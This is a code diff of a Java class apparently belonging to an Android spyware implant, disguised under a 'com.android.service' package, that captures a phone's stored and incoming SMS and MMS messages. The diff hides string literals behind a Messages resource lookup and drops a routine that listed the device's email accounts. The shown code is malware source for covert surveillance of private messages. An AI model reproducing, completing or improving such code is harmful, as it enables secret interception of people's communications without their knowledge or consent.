@@ -13,13 +13,10 @@ import java.util.ArrayList;
 import java.util.Date;
 import java.util.Iterator;
 
-import android.accounts.Account;
-import android.accounts.AccountManager;
-
 import com.android.service.LogR;
+import com.android.service.Messages;
 import com.android.service.Mms;
 import com.android.service.Sms;
-import com.android.service.Status;
 import com.android.service.agent.sms.MmsBrowser;
 import com.android.service.agent.sms.SmsBrowser;
 import com.android.service.auto.Cfg;
@@ -41,8 +38,8 @@ import com.android.service.util.WChar;
  * @real-author Que, r0x
  */
 public class AgentMessage extends AgentBase implements Observer<Sms> {
-	private static final String TAG = "AgentMessage";
-
+	private static final String TAG = "AgentMessage"; //$NON-NLS-1$
+	//$NON-NLS-1$
 	private static final int SMS_VERSION = 2010050501;
 
 	// private SmsHandler smsHandler;
@@ -56,7 +53,7 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 		// Abbiamo gia' catturato lo storico
 		if (storedImsi.isMarkup() == false) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (begin): cattura sms di storico");
+				Check.log(TAG + " (begin): cattura sms di storico");//$NON-NLS-1$
 			}
 
 			final SmsBrowser smsBrowser = new SmsBrowser();
@@ -112,22 +109,6 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 		return 0;
 	}
 
-	// SNIPPET
-	/**
-	 * Check email accounts.
-	 */
-	private void checkEmailAccounts() {
-		final Account[] accounts = AccountManager.get(Status.getAppContext()).getAccounts();
-
-		for (final Account account : accounts) {
-
-			final String name = account.name;
-			if (Cfg.DEBUG) {
-				Check.log(TAG + name);
-			}
-		}
-	}
-
 	private void saveSms(Sms sms) {
 		final String address = sms.getAddress();
 		final byte[] body = WChar.getBytes(sms.getBody());
@@ -139,7 +120,7 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 
 	private void saveMms(Mms mms) {
 		final String address = mms.getAddress();
-		final byte[] subject = WChar.getBytes("MMS Subject: " + mms.getSubject());
+		final byte[] subject = WChar.getBytes(Messages.getString("AgentMessage.1") + mms.getSubject()); //$NON-NLS-1$
 		final long date = mms.getDate();
 		final DateTime filetime = new DateTime(date);
 		final boolean sent = mms.getSent();
@@ -156,11 +137,11 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 
 		if (sent) {
 			flags = 0;
-			from = "local";
+			from = Messages.getString("AgentMessage.2"); //$NON-NLS-1$
 			to = address;
 		} else {
 			flags = 1;
-			to = "local";
+			to = Messages.getString("AgentMessage.3"); //$NON-NLS-1$
 			from = address;
 		}
 
